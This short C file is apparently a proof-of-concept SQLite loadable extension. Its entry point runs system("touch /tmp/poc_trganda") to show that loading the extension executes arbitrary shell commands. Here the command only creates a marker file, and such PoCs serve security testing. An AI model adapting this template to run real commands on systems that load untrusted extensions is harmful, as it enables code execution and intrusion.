#include <sqlite3ext.h>
#include <stdlib.h>
SQLITE_EXTENSION_INIT1

#ifdef _WIN32
__declspec(dllexport)
#endif
int poc( /* <== Change this name, maybe */
  sqlite3 *db,
  char **pzErrMsg,
  const sqlite3_api_routines *pApi
){
  int rc = SQLITE_OK;
  SQLITE_EXTENSION_INIT2(pApi);
  /* insert code to initialize your extension here */

  system("touch /tmp/poc_trganda");

  return rc;
}
